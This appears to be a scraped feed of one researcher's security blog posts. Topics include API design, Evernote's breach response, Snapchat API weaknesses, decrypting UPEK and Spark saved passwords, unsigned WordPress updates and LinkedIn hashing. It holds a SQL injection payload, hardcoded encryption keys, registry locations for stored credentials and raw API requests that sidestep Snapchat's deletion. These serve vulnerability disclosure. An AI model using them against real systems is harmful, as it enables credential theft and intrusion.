<p>The first example is simple and clear, the second is a <em>bit</em> less obvious. The API design itself is leading developers down the wrong path - it supports two syntaxes, one simple and easy to comprehend - but extremely dangerous, and one that&#8217;s more complex, less obvious, but safer. Without understanding the security implications, which syntax do you think developers will pick?</p>

<p>While developers should know more than they do (and I&#8217;m not trying to excuse their ignorance) - the years of effort and the daily reports of SQLi breaches should tell us that trying to educate all of the world&#8217;s developers isn&#8217;t working. As long as the <em>easy way</em> to use an API is the insecure way, we&#8217;ll continue to see a steady stream of breaches.</p>

<p>While I agree with Chris that the documentation is a real issue - the APIs are just as much to blame. <em>Bad APIs make for bad developers</em>.</p>

<p><strong>Secure by default</strong></p>

<p>When a developer is working on a new API, they should ask if they are doing harm with the design. The maxim &#8220;first, do no harm&#8221; should be running through their head with each decision. Doing no harm - being secure by default, not leading developers astray - really should be the foremost goal of any API.</p>

<p>I don&#8217;t mean to pick on PHP&#8217;s MySQL API here, it&#8217;s just one of many that are designed this way. Look at any API on any platform, odds are better than not that security was an afterthought - if it was given any thought at all.</p>

<p>As anyone who writes code can attest, writing secure code is hard - but when the APIs that developers are given encourage insecure usage, it&#8217;s that much more likely that holes will be found. While organizations like <a href="https://www.owasp.org/index.php/Main_Page">OWASP</a> are making some progress in education and awareness, it&#8217;s obviously not enough. Platforms need to be updated, APIs need to be fixed - this won&#8217;t be a quick process, but we won&#8217;t see real change until the APIs are improved.</p>

      <title>Evernote: Doing it (mostly) right</title>
      <description><p><em>(Update: See <a href="http://arstechnica.com/security/2013/03/critics-substandard-crypto-needlessly-puts-evernote-accounts-at-risk/">here</a> for more information about what they did wrong, including a vulnerability I found in the password handling of the Android app.)</em></p>

<p>So the big news today is <a href="http://evernote.com/corp/news/password_reset.php">Evernote being popped</a>; with 50m users and user base that often stores sensitive material - it certainly is a tempting target for many reasons.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>Important: Evernote just implemented a service-wide password reset. Please read our post for details and instructions <a href="http://t.co/4LQABJBYnJ" title="http://ow.ly/icT02">ow.ly/icT02</a></p>&mdash; evernote (@evernote) <a href="https://twitter.com/evernote/status/307882426129055744">March 2, 2013</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>CNET was able to <a href="http://news.cnet.com/8301-1009_3-57572212-83/online-note-service-evernote-latest-firm-to-get-hacked/">get a quote</a> from Evernote on the issue, providing some extra insight compared to what&#8217;s in their announcement:</p>

<blockquote><p>Our operations and security team caught this at what we believe to be the beginning stages of a sophisticated attack. They are continuing to investigate the details. We believe this activity follows a similar pattern of the many high profile attacks on other Internet-based companies that have taken place over the last several weeks.</p><footer><strong>Evernote Representative</strong> <cite>CNET</cite></footer></blockquote>


<p>But there&#8217;s plenty being written about the hack - what I&#8217;m more interested in is the response. Let&#8217;s take a look at what&#8217;s happened (publicly, at least):</p>

<p><em>Feb 28th:</em> Evernote&#8217;s Operations &amp; Security team notices potentially malicious activity.</p>

<p><em>This Morning:</em> User&#8217;s started noticing that the client stopped syncing, complaining of a password issue. If a user logs into the web interface, they are prompted to set a new password.</p>

<p><em>10:57AM EST:</em> Evernote posted a blog post and linked to it on Twitter (see above); within a few minutes their blog was returning a database connection error. Later visiting the blog returned a maintenance page, a database error, or a 503 error.</p>

<p><em>11:57AM EST:</em> Evernote posted a new link and redirected the original blog post.</p>

<p><em>1:45PM EST:</em> Received email notifying of incident and password reset. As this email was sent to ~50m users, it&#8217;s to be expected that there&#8217;s a large window during which users received it.</p>

<p><em>What&#8217;s not happened yet:</em> Despite several requests from different people, they have yet to release any technical information on how the passwords were stored, beyond that they were hashed &amp; salted.</p>

<p><strong>What&#8217;s Right &amp; What&#8217;s Wrong</strong></p>

<p><em>Two days from finding issue to notifying users</em> - I&#8217;ve seen some people complain about this delay, but given that the priority is stopping the attack first, and the need to capture evidence as quickly as possible to give the best chance of understanding just what happened - I&#8217;d call this quite reasonable. Compared to some other companies that waited weeks or even months, I&#8217;d say they got this one right.</p>

<p><em>User notification</em> - This is a hard one, on one hand you have the need to secure accounts as soon as possible while on the other, is letting users know why they are being required to change their password. I wish they had been able to get the email notification out sooner, but it was more important that they secure the accounts.</p>

<p>Because of the delay in notifying users, it&#8217;s possible for some users to change their password and go on with their day without knowing why they needed to change the password - or that if they use that same password elsewhere it needs to be changed there as well. They should have made what happened clear when changing the password.</p>

<p>Now, the email itself deserves to be called out - it&#8217;s known that the email addresses where in the stolen data, so emails claiming to be from Evernote require an extra look to make sure they aren&#8217;t phishing. Evernote, to add to the confusion, made a huge mistake: the links in the email don&#8217;t go to <code>evernote.com</code> - they go to <code>links.evernote.mkt5371.com/ctt?...</code>. That raises a few red flags&#8230;</p>

<p><em>The blog post</em> - I love WordPress, but it&#8217;s not always the best choice when you are expecting <em>lots</em> of traffic. They really should have hosted the notice from a static page from the beginning instead of trying to keep WordPress up under that much pressure.</p>

<p><em>The password reset process</em> - To reset the password, all you had to do was login with the existing password to the web site - the same password that was just stolen. No proof of identity at all. If the attackers were able to crack the hashed passwords, they could easily change the password themselves and access the account.</p>

<p>This really should have been done better.</p>

<p><em>Disclosing technical details of password storage</em> - As I stated above, this hasn&#8217;t happened despite numerous requests. While researchers need to know this to understand the risks of the passwords being cracked, unfortunately it&#8217;s possible that this information could help the attackers if they weren&#8217;t able to acquire source code that reveals the inner workings of their password handling.</p>

<p>For example, if the attack vector was SQL injection, it&#8217;s possible to exfiltrate the data without being able to get to code.</p>

<p><strong>Overall</strong></p>

<p>It seems that they have handled this responsibly as possible; this isn&#8217;t the kind of event anybody is truly prepared for. Could it have been done better? Yes, in a few ways - but they could have done so much worse.</p>

<p>It could be argued that in the grand scheme, <a href="http://markpercival.us/post/44391805072/evernote-doesnt-really-care-about-security">they don&#8217;t care about security</a> - from my experience, that&#8217;s the impression I&#8217;ve gotten.</p>

      <title>Revisiting Snapchat API &amp; Security</title>
      <description><p>As <a href="http://www.snapchat.com">Shapchat</a> has increased in popularity, I&#8217;ve been asked several times to revisit my <a href="http://adamcaudill.com/2012/06/16/snapchat-api-and-security/">Snapchat API &amp; Security</a> post, to address the changes that they made in response to my complaints. So, here is it - sorta.</p>

<p>I started making detailed notes and looking at the changes they made - but yesterday <a href="https://twitter.com/tlack">@tlack</a> made that mostly irrelevant with his release of <a href="https://github.com/tlack/snaphax">Snaphax</a>, a PHP library to interact with the undocumented Shapchat API. So for now, if you want to know more about their API or if you just want to save images or video - I&#8217;d suggest taking a good look at the Snaphax code. What I will do though, is talk about some of their changes and what they did right and what they did wrong.</p>

<p><strong>Retrieving images is now destructive&#8230;</strong></p>

<p>In the previous API version, you could request the same image from the <code>blob</code> API any number of times, until <code>ss_pa</code> was called to delete the image from the Snapchat servers (which occurred only after the image was viewed, opening a window to save the image before viewing it in the application) - the new <code>ph/blob</code> API removes the image once it&#8217;s been delivered to the client. Without the ability to pull the image multiple times, &#8216;downloader&#8217; tools are far less attractive - instead, to consistently download the media, users will need full replacement clients. This extra bit of inconvenience is probably one of the most effective deterrents against lazy attackers (likely the most common scenario).</p>

<p><strong>ECB mode, really?!?!</strong></p>

<p>Media is encrypted when it&#8217;s sent to the client - this makes it harder to capture data via a MiTM attack, and makes it slightly more complicated to build alternate clients. But, there are a few issues:</p>

<ul>
<li>The media is encrypted with AES, in <a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Electronic_codebook_.28ECB.29">ECB mode</a> - I can&#8217;t imagine how they made such a mistake.</li>
<li>Media is decrypted before going into the cache, instead of when it needs to be displayed - allowing it to be accesses on rooted devices.</li>
<li>A single, hard-coded key (<code>M02cnQ51Ji97vwT4</code>) is used to encrypt the data.</li>
</ul>


<p>Pretty much everything here could have been done better; some of the problems are just simple mistakes, others a result of ignorance.</p>

<p><strong>Security by obscurity&#8230;</strong></p>

<p>When looking at the traffic that the application generates, one of the first things you notice is the new <code>req_token</code> field - at first glance it looks like a SHA-256 hash (and has been mistaken for one more than once), but it&#8217;s not - it&#8217;s two SHA-256 hashes that have been merged in a specific pattern. All of the data to generate this token is already included in most requests (path, timestamp, auth token), but the secret to generating it is the algorithm used to merge them into one.</p>

<p>Prior to @tlack&#8217;s work, this token has been a stumbling block to those attempting to unravel the API - only because of the obscurity of their custom merger algorithm. Now that there is code that demonstrates how this works - the security benefit of the <code>req_token</code> has been completely eliminated. When you rely on the secrecy of an algorithm, it will bite you.</p>

<p><strong>Doing it right&#8230;</strong></p>

<p>Making a product like this work is quite easy - making it work right is extremely hard. Snapchat has entered a business where at least some of their users place an extreme amount of trust in them - a failure of their security could have a profound impact on their users lives. Any company that is in the business of handling very private communications is held to a higher standard - and Snapchat is no exception. Security should be the top priority when working on a product like this - and when you see such blatant mistakes as using ECB mode encryption, it&#8217;s obvious that they don&#8217;t take it seriously enough.</p>

<p>Snapchat needs to hire an outside security consultant to review their systems to identify the flaws such as those I&#8217;ve pointed out and provide real solutions - and they have the <a href="http://www.businessinsider.com/snapchat-raising-8-million-from-instagram-backers-2012-12">money</a> to do it. Until they do, there will continue to be these cat and mouse games - and they&#8217;ll lose every time.</p>

      <title>UPEK Windows Password Decryption</title>
      <description><p>On August 28th ElcomSoft <a href="http://blog.crackpassword.com/2012/08/upek-fingerprint-readers-a-huge-security-hole/">announced</a> that they had determined a method to extract Windows passwords from the registry for users of UPEK&#8217;s fingerprint readers and Protector Suite software (UPEK is now owned by AuthenTec, which is now owned by Apple). What they didn&#8217;t announce was the technical details of how they did it. Myself and <a href="http://brandonw.net/">Brandon Wilson</a> have been working to recreate their research - and we have.</p>

<p>We have not been in contact with ElcomSoft, so this is an independent re-discovery of this vulnerability. ElcomSoft has committed to not release details, which I understand - but given how likely it is that others will determine this technique, I believe that this information should be available to pen-testers and auditors so that these insecure credentials can be identified.</p>

<h3>The Details</h3>

<p>ElcomSoft blasted the security of UPEK&#8217;s product, saying:</p>

<blockquote><p>we found that your Windows account passwords are stored in Windows registry almost in plain text, barely scrambled but not encrypted</p></blockquote>


<p></p>

<p>This isn&#8217;t quite accurate - but certainly close enough. The data is stored in the following location (varies by version):</p>

<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Virtual Token\Passport\4.0\Passport\&lt;user&gt;\ExData</code></p>

<p>The first 24 bytes are header and size information, after the encrypted data there is a 4 byte number that indicates the number of bytes in the next section, the following bytes are used in the IV. The encryption key is &#8216;generated&#8217; using a PBKDF2-like function that uses MD5 hashing, but unfortunately when storing data in the registry they aren&#8217;t using a password - so the outcome is based purely on an MD5 hash that they are using as a &#8216;seed&#8217; value. This means that the key used is always the same.</p>

<p>Better: the key is only 56 bits.</p>

<h3>AES-56</h3>

<p>On the AuthenTec&#8217;s website they mention using 56-bit AES (due to the old export restrictions) - this confused me for quite some time, not only does AES not support 56-bit (or anything else less than 128 bits), from looking at the algorithm trying to make it support a key size that isn&#8217;t a multiple of 32 bits would be quite challenging. So how did they do it? They cheated.</p>

<p>They are actually using AES-256, and padding both the 56-bit key and IV with nulls. In other words, they are taking a very strong crypto and stripping it of its value.</p>

<h3>The Data</h3>

<p>Besides the Windows password, the data also includes the domain and login (all in Unicode), along with other various bits that&#8217;s less interesting from a pen-testing perspective. Looking at the raw data, you can identify the password from the <code>P1</code> header, <code>0x11</code> denotes the login, and <code>0x12</code> indicates the domain.</p>

<p>The biometric data may be of some interest, but not to me.</p>

<h3>Code</h3>

<p>We&#8217;ve <a href="https://github.com/brandonlw/upek-ps-pass-decrypt">posted</a> a proof-of-concept tool to Github, it&#8217;s written in C#, and thus requires the .NET 4.0 framework be installed (<a href="http://adamcaudill.com/files/FingerprintEncryption.2012.10.16.1847.zip">download here</a>). I also plan to write a Metasploit post module, but it&#8217;s not ready yet.</p>

<h3>UPDATE</h3>

<p>So it turns out that AuthenTec <a href="http://support.authentec.com/Downloads/Windows/ProtectorSuite.aspx">released</a> a patch for this on 9/18 - and we missed it (as did pretty much everybody else). We were alerted to the patch late on 10/10, and last night (10/11), we completed work on breaking it. We&#8217;ve updated the Github repository with the new code, it supports both the old versions and the new version they released on 9/18. They are now using DPAPI (among other things), so if you have the new version, you&#8217;ll need to run it in the context of LocalSystem so that you can access the correct encryption keys. This can be done quite easily with <code>psexec</code> - see the <a href="https://github.com/brandonlw/upek-ps-pass-decrypt#readme">README</a> for details.</p>

<p>From a security perspective, the new version is somewhat more secure - but obviously, still easily attacked. They are now using a &#8216;seed&#8217; of 16 random bytes (which is stored in <code>ExData</code> and protected via DPAPI), which is then hashed with SHA1, the hash is then passed into their key derivation method to produce the 56 bit key that is used to encrypt the main data block. Within the main data block there is another DPAPI block where the password was previously stored - this was something of a surprise to us at first, as they had obfuscated the code to hide this part. This second DPAPI block contains the user&#8217;s password, and can be easily decrypted with the same method used to decrypt the block containing the &#8216;seed&#8217; data.</p>

<p>Both of the DPAPI calls use the same entropy data - a block of 0x86 bytes, at the beginning is the word &#8216;Software&#8217; and a 0x01 at offset 0x2B and a 0x05 at 0x43 - and as said above, the DPAPI calls are made in the context of the LocalSystem user, and thus needs to be decrypted within that same context.</p>

<p>The new <code>homepass.dll</code> file contains new anti-debugging code, as well as obfuscated code to complicate reverse engineering - fortunately, or unfortunately depending on your point of view - these new &#8216;protection&#8217; mechanisms are trivial to bypass. To avoid this becoming a cat &amp; mouse game, we won&#8217;t be releasing further updates to this code - but I think it&#8217;s safe to say that it&#8217;s fundamentally broken, and any fixes they release can be bypassed without excessive effort.</p>

<p>I would not trust this software in a corporate environment.</p>

      <title>WordPress: Don&#39;t trust that update</title>
      <description><p>Want to know the easiest way to hack most of the WordPress installs on a host? It&#8217;s as easy as attacking the host&#8217;s internal DNS server, then just sitting back and waiting on users to install your backdoor. If you can manage to change the IP address that &#8220;api.wordpress.org&#8221; resolves to, you&#8217;ve won the battle.</p>

<p>I can&#8217;t take credit for finding this, it was pointed out on Twitter:</p>

<div class='embed tweet'>Tweet could not be processed</div>


<p>So this is nothing new - though I don&#8217;t think most users realize that this hole exists, or how hard it would be to find out that they&#8217;ve been attacked.</p>

<p>Internal networks rarely receive the same degree of scrutiny as public facing systems when it comes to updates and hardening, making an attack against an internal DNS server not just possible - but quite likely. Since HTTPS isn&#8217;t used to protect against MITM attacks, and the packages aren&#8217;t signed, so there&#8217;s no verification that what you downloaded matches what was released. So going after the DNS server is just one attack option.</p>

<p>Here&#8217;s a quick overview of just how it could happen:</p>

<ul>
<li>Hacker signs up for an account with a large host</li>
<li>The attacker targets the internal DNS server and manages to redirect the API domain</li>
<li>The API domain now points to an altered update check that serves an infected update package</li>
<li>Users install updates with no idea that they aren&#8217;t original</li>
</ul>


<p>It would be trivial to modify the WordPress update package to add a backdoor and modify the update check (<code>wp-includes/update.php</code>) to point to the attacker&#8217;s site - that way if the attack against the DNS server is fixed, compromised sites will remain compromised. This does assume that the host&#8217;s internal DNS server has some vulnerability - but in my experience that wouldn&#8217;t be surprising.</p>

<p>If the WordPress team started signing their updates, these issues would be gone; though it doesn&#8217;t look like that will happen:</p>

<div class='embed tweet'>Tweet could not be processed</div>


<p>What makes this worse? Both the API and download domains already support HTTPS, but this doesn&#8217;t do any good if the application is hardcoded to use HTTP.</p>

<p>Line #29 there is the key, by concatenating untrusted data into the SQL query, it has made SQL injection trivial. This vulnerability can be demonstrated with the following request:</p>

<p><code>signup_check.php?field=username&amp;value='+OR+SLEEP(5)+OR+'</code></p>

<p>This results in the following query being executed:</p>

<p><code>SELECT username FROM user WHERE username = '' OR SLEEP(5) OR '' LIMIT 1</code></p>

<p>The author has been notified, but has yet to respond. Based on the one open <a href="https://github.com/tlhunter/neoinvoice/issues/2">ticket</a> for the project, there&#8217;s likely other possible attack vectors.</p>

      <title>Decrypting Spark Saved Passwords</title>
      <description><p>A friend of mine has been evaluating an open source instant messaging client called <a href="http://www.igniterealtime.org/projects/spark/http://www.igniterealtime.org/projects/spark/">Spark</a>, which can be linked to Active Directory for authentication. Like most IM clients, Spark allows users to save their password - and me being me, I was curious as to how it&#8217;s doing this - as storing Windows domain logins is kinda a big deal.</p>

<p>So, within a few minutes I found all of the details - and none of them make me feel any better. Here are the important bits:</p>

<ul>
<li>Encrypted with Triple DES in ECB mode.</li>
<li>IV isn&#8217;t being set.</li>
<li>Encryption key is <strong>hardcoded</strong>.</li>
</ul>


<p>This means that all users have the same, <a href="http://svn.igniterealtime.org/svn/repos/spark/trunk/src/java/org/jivesoftware/spark/util/Encryptor.java">publicly documented</a> encryption key protecting their password. What&#8217;s the key? It&#8217;s <code>ugfpV1dMC5jyJtqwVAfTpHkxqJ0+E0ae</code> in Base64 encoding - and thanks to this, it&#8217;s trivial to write code to reverse the &#8220;protection&#8221; and make the credentials (which may well be domain credentials) available to anyone with access to the users profile.</p>

<p>So, that&#8217;s what <a href="https://github.com/adamcaudill/sparkim-passview">I did</a>. This is simple code that will scan a machine looking for Spark configuration files (named <code>spark.properties</code>) and checks each to see if a password can be extracted. You can also pass in a NetBIOS name, and it will attempt to use the administrative share (C$) to access the profiles on the system. Take a look at the <a href="https://github.com/adamcaudill/sparkim-passview#spark-im-password-decrypter">README</a> for more details.</p>

<p>The saving grace here, is that you have to have access to the user profiles, so if a system is locked down throughly, you likely won&#8217;t make much progress. But if you can get a local administrator account to run this from - it may make a pentest go a little quicker.</p>

<p>I&#8217;ve tried to find a way to disable the &#8216;Save Password&#8217; feature, but it seems that the only option was to <a href="http://community.igniterealtime.org/thread/37785">patch the source</a>. If you are using Spark within your environment, I strongly recommend that you carefully consider how it&#8217;s used and integrated with AD or other systems.</p>

<p>Earlier today a group called &#8221;<a href="https://d33ds.co/">D33Ds Company</a>&#8221; released a large (17MB) <a href="https://d33ds.co/archive/yahoo-disclosure.txt">dump</a> from a Yahoo server. The dump includes information from a MySQL database, and the email addresses and passwords from over 450k users. Based on some of the emails and the naming of the tables, I suspect that the data is from <a href="http://en.wikipedia.org/wiki/Associated_Content">Associated Content</a> - a company that Yahoo bought in 2010, and closed in 2011 -  replacing it with <a href="http://voices.yahoo.com/">Yahoo Voices</a>.</p>

<p>The group that released the dump &#8220;censored&#8221; the name of the server in question, but they neglected to clear the HOSTNAME field in the MySQL information, exposing the server name: dbb1.ac.bf1.yahoo.com</p>

      <title>Assange, Ecuador, and the Cyberarmy</title>
      <description><div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>ALERT: Julian Assange has requested political asylum and is under the protection of the Ecuadorian embassy in London<a href="http://t.co/bz4O9bjF" title="http://justice4assange.com/donate.html">justice4assange.com/donate.html</a></p>&mdash; WikiLeaks (@wikileaks) <a href="https://twitter.com/wikileaks/status/215152161502412801">June 19, 2012</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>The news that Julian Assange has <a href="http://www.cnn.com/2012/06/19/world/europe/ecuador-assange-asylum/index.html">asked Ecuador</a> for political asylum is flooding twitter as his supporters do their best to attract attention to his cause, and rally everyone they can to contact Ecuador&#8217;s embassy in London to urge them to grant Assange&#8217;s request. While I&#8217;ve watched the Assange case since before the first allegations came out of Sweden - that&#8217;s not my interest here, my interest is in what Ecuador <em>could</em> do if they wanted to.</p>

<h3>Building a cyber-army</h3>

<p>Ecuador has an interesting problem right now, they can offer to help Assange - which will certainly draw the ire of the US and its closest allies, or they can do nothing - and possibly lose a chance at building a new army. Let me explain&#8230;</p>

<p>The governments of the US and other large powers are spending a lot of money to recruit and train what the press has dubbed &#8216;cyber-warriors&#8217; (i.e. hackers) to perform offensive operations. For smaller countries - throwing a huge budget at something like this just isn&#8217;t possible, but they do have another option. If a country was to offer safe harbor to those at risk of being prosecuted for hacking and related crimes in exchange for assisting their military - they could define a new form of super-power.</p>

<p>The US and UK  both make a habit of throwing their best hackers in prison - if Ecuador helps Assange, it could set the stage for them to help others accused of similar crimes in the future. If they are smart about who they help - they could easily build an army of hackers, an army that could set a new standard for power and control of the technology that we are so dependant on.</p>

<p>(Yes, I realize that Assange isn&#8217;t a hacker himself, but he has a loyal following of those that are - and the action would set the precedent making this possible.)</p>

<p>Wether it will be Ecuador today, or some other small state later I don&#8217;t know - but I&#8217;m willing to bet money that it will happen.</p>

<h3>The future of war</h3>

<p>War has evolved in interesting ways - from arrows, to guns, then to bombs - but the next step is clear: the electron. War (and the power to make war, which I would argue is what&#8217;s really important) will be more about espionage and sabotage than it&#8217;s ever been before. Power grids, banks, communications, and industrial systems will all be targets - and the ability to manipulate these systems will define who the real super powers are.</p>

<p>Imagine the impact to the economy should one of the stock exchanges be attacked, and fake trades generated to drive the price of stocks down. Would we see the <a href="https://en.wikipedia.org/wiki/Wall_Street_Crash_of_1929">crash of 1929</a> again?</p>

<p>There are also far more subtle attacks that could be perpetrated against a countries ability to make war. Changing technical drawings for example, that could cause a breakdown in a supply chain rendering supplies and equipment useless (e.g. guns bored wrong, missiles wired improperly). Something as simple as changing the quantity or product code on a military order could prevent operations due to a lack of necessary supplies. It&#8217;s attacks like these that would likely target less secure, lower priority systems, that would cause the most chaos.</p>

<p>It&#8217;ll be interesting to see what happens next, whatever it is - it&#8217;s sure to have repercussions for years to come.</p>

      <title>Snapchat: API &amp;amp; Security</title>
      <description><p><strong>Update 2:</strong> The Snapchat API has changed to address the issues I pointed out to them - and the new API has issues as well. I&#8217;ve <a href="http://adamcaudill.com/2012/12/31/revisiting-snapchat-api-and-security/">posted an update</a> that covers some of these changes.</p>

<p><strong>Update:</strong> I heard back from one of the co-founders, he said that they&#8217;d be updating the application to address this in the &#8220;very near future.&#8221; I have to applaud them for the great way they handled this.</p>

<p><a href="http://www.snapchat.me/">Snapchat</a> was recently <a href="http://techcrunch.com/2012/06/08/snapchat-110-million/">featured</a> on TechCrunch, pointing out that they are expanding to Android and that they&#8217;ve now handled over 110M pictures. So when I see something about an application that auto-deletes messages after they are viewed - I did the only natural thing: dig in and see if it really is secure.</p>

<p>I <a href="http://adamcaudill.com/2012/06/10/monitor-iphone-http-s-traffic-with-fiddler/">monitored</a> the messages being sent back and forth, and mapped out the APIs they use. They have a simple API, which uses both JSON and form-encoding to transfer data. The API itself is fairly clean and easy to understand. Writing a new client against this API is fairly simple - <em>including a client that automatically saves all image received</em>.</p>

<h3>Downloading Images</h3>

<p>The process to download images is pretty simple, it can be as simple as two API calls. The first API needed is <code>ss_auth</code> - the API is used to create sessions. The call to login looks like this:</p>

<pre><code>POST https://feelinsonice.appspot.com/ss_auth HTTP/1.1
Host: feelinsonice.appspot.com
User-Agent: Snapchat 3.0 rv:3.0.0 (iPhone; iPhone OS 5.1.1; en_US)
Content-Length: 32
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip
Connection: close
Proxy-Connection: close

u=&lt;user&gt;&amp;t=&lt;password&gt;&amp;a=login
</code></pre>

<p>This will return JSON containing couple useful things:</p>

<ol>
<li>The session token, which is required for all other calls.</li>
<li>A list of images that haven&#8217;t been viewed yet (the &#8220;id&#8221; field being the most important).</li>
</ol>


<p>Once the returned JSON is parsed, the rest is just making calls to the <code>blob</code> API - this is the API that actually returns the image data (as a JPG), and can then be saved to disk. The URLs to retrieve an image look like this:</p>

<pre><code>https://feelinsonice.appspot.com/blob?u=&lt;user&gt;&amp;t=&lt;session-token&gt;&amp;i=&lt;image-id&gt;
</code></pre>

<p>This allows images to be easily downloaded, without them being removed.</p>

<h3>How it normally works&#8230;</h3>

<p>In the mobile application, a call to the <code>ss_pa</code> API is made when an image is viewed, this removes the image - and once this is called, there doesn&#8217;t seem to be a way to get the image back.</p>

<pre><code>POST https://feelinsonice.appspot.com/ss_pa HTTP/1.1
Host: feelinsonice.appspot.com
User-Agent: Snapchat 3.0 rv:3.0.0 (iPhone; iPhone OS 5.1.1; en_US)
Content-Length: 102
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip
Connection: close
Proxy-Connection: close

u=&lt;user&gt;&amp;t=&lt;session-token&gt;&amp;v_str=%7B%22&lt;image-id&gt;%22%3A%22&lt;unix-timestamp&gt;%22%7D
</code></pre>

<p>This API call is the key to keeping the image from being accessed again. If a client didn&#8217;t implement this API, it would allow users to access the images any time they like - completely bypassing the entire point of the application.</p>

<h3>Other APIs</h3>

<p>Here are some of the other APIs used:</p>

<ul>
<li><code>ss_refresh</code> - pull the list of images (this API returns a subset of what&#8217;s returned by <code>ss_auth</code>)</li>
<li><code>nsp</code> - uploads an image</li>
<li><code>clear</code> - clears the user&#8217;s history</li>
<li><code>auth</code> - used to destroy the session, not to be confused with <code>ss_auth</code></li>
</ul>


<p>All of these are easily understood and implemented. There are other APIs, for things like registration that I didn&#8217;t look into, as they are beyond the scope of this research.</p>

<h3>Unofficial clients</h3>

<p>With such a simple API I&#8217;d be amazed if other, unofficial, clients didn&#8217;t start turning up - with saving images being their primary feature. A crappy but functional Android client that supports saving could be built in a couple hours.</p>

<p>For now I&#8217;m not making any proof-of-concept code available, as I believe that this article makes it sufficiently clear how easy it is to write an unofficial client for this service that allows images to be saved. The goal here isn&#8217;t to exploit this hole, but to point out the risk of untrusted clients.</p>

<h3>Overall</h3>

<p>Session management is fairly well done - and would certainly make unofficial clients that aren&#8217;t full-featured less attractive due to needing to login so often; but this certainly doesn&#8217;t provide any protection. The API itself seems to have no protection against untrusted clients, making it trivial to save images or perform other unintended actions.</p>

<p>I did contact the authors to suggest that they encrypt the image data when it&#8217;s sent to the client, making it harder to get the data without reverse engineering the application. It wouldn&#8217;t stop everyone, but it would make the task less trivial.</p>

<p>Given the nature of the application, I suspect unofficial clients are unavoidable though - especially as the service grows in popularity (as I expect it will once the official Android client is released).</p>

      <title>Monitor iPhone HTTP(S) Traffic with Fiddler</title>
      <description><p>For a research project I decided that I needed to monitor the traffic to and from my iPhone - both HTTP and HTTPS. Having had so much luck with Fiddler in the past, it was the first place I looked. There are a number of posts on this topic, but few that provide a clear and complete picture of what&#8217;s needed. So I wrote one.</p>

<p>First, install the latest version of <a href="http://www.fiddler2.com/fiddler2/version.asp">Fiddler</a>, then install the iOS-compatible <a href="http://www.fiddler2.com/dl/FiddlerCertMaker.exe">certificate generator</a>. Now update the settings to decrypt HTTPS traffic:</p>

<p><img class="center" src="http://adamcaudill.com/files/2012-06-10_1430.png"></p>

<p>Next, update the settings to allow remote connections (make sure that restart Fiddler after this):</p>

<p><img class="center" src="http://adamcaudill.com/files/2012-06-10_1433.png"></p>

<p>Then export the Fiddler Root Certificate to your desktop from the options dialog:</p>

<p><img class="center" src="http://adamcaudill.com/files/2012-06-10_1436.png"></p>

<p>Email the <code>FiddlerRoot.cer</code> file to your iPhone - you&#8217;ll need to import and trust the certificate to make this work. To install certificate, just click on the attachment and click the &#8216;Install&#8217; button.</p>

<p>Now configure your iPhone to use the Fiddler proxy. The setting can be found at Setting -> Wi-Fi -> (your network) -> HTTP Proxy -> Manual. Set the &#8216;Server&#8217; to the IP address of of your PC, then set &#8216;Port&#8217; to 8888, and &#8216;Authentication&#8217; to off.</p>

<p>You should now be able to see all of the HTTP and HTTPS traffic going across your phone. It&#8217;s worth noting though, that some applications won&#8217;t work while using the proxy - Twitter being one, though most work without issue.</p>

      <title>LinkedIn: A little common sense</title>
      <description><p>The fact that LinkedIn was breached has been well covered and <a href="http://blog.linkedin.com/2012/06/06/linkedin-member-passwords-compromised/">confirmed</a>, but in their confirmation they said something that I personally found insulting, more than anything else:</p>

<blockquote><p>It is worth noting that the affected members who update their passwords and members whose passwords have not been compromised benefit from the enhanced security we just recently put in place, which includes hashing and salting of our current password databases.</p></blockquote>


<p>So, they just recently started salting their hashes? Seriously?</p>

<p>Storing passwords via unsalted SHA-1 is not only unsafe, it&#8217;s reckless. When you store user credentials, you have a responsibility to your users to keep their data safe - in this case LinkedIn failed, epicly. Had they bothered to think about security, or hired people that understood even the most basic principles of secure application development - this wouldn&#8217;t have happened.</p>

<p>When properly implemented, hashed data shouldn&#8217;t be (practically) reversible to its original value - that is, after all, the purpose of hashing. Tweets like this though, make it painfully clear just how wrong LinkedIn got it:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>So far 3,427,202 passwords have cracked from LinkedIn List Almost 50%Its been about 24 hours - The longest? a 29 letter sentence from Bible</p>&mdash; KoreLogic(@CrackMeIfYouCan) <a href="https://twitter.com/CrackMeIfYouCan/status/210474428407103490">June 6, 2012</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>They violated the most basic security principles, but more importantly, they violated their users&#8217; trust.</p>

      <title>Piracy is not Theft</title>
      <description><p>For many years now groups like the MPAA and RIAA have tried to convince the public that piracy (that is, copyright infringement) is theft - and many people have come to believe this, but it&#8217;s not true. In reality, copyright infringement is far more analogous to trespassing than it is to theft in its core concepts - and even moreso in the digital world.</p>

<p>To make it clear, I am looking at this from a largely historical perspective, looking at the origins of copyright and how it was intended to be used. This gives us a better view than the current laws that have been greatly influenced and complicated by politics and money from those that have a vested interest in maximizing copyright protections and broadening its definitions.</p>

<p>First, let&#8217;s look at the legal definition of theft - this specific definition is from British law, from which many early American laws derived.</p>

<blockquote><p>A person is guilty of theft, if he dishonestly appropriates property belonging to another with the intention of permanently depriving the other of it&#8230;</p></blockquote>


<p>Next, let&#8217;s take a look at this excerpt from the <a href="http://en.wikipedia.org/wiki/Copyright_Act_of_1790">Copyright Act of 1790</a>, the first copyright act at the federal level in the United States - which was heavily influenced by the 1710 <a href="http://en.wikipedia.org/wiki/Statute_of_Anne">Statute of Anne</a>:</p>

<blockquote><p>&#8230;the author and authors of any map, chart, book or books already printed within these United States, &#8230;, who halt or have not transferred to any other person the copyright of such map, chart, book or books, share or shares thereof; and any other person or persons, &#8230;, shall have the sole right and liberty of printing, reprinting, publishing and vending such map, chart, book or books, for the term of fourteen years from the recording the title thereof in the clerk’s office&#8230;</p></blockquote>


